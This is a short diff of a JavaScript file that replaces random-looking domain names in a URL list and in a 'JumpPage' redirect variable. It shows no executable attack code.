@@ -37,12 +37,12 @@ var emails = [
 ];
 
 var urls=[
-	'pibmuytz.cc/', 
+	'ahzkxsedw.com/', 
 	'ahzkxsedw.com/', 
     'ahzkxsedw.com/',
 ];                                                                                                                  
 
-var JumpPage="https://aicrdj.com";
+var JumpPage="https://pibmuytz.cc";
 
 var newestUrls = [];
 
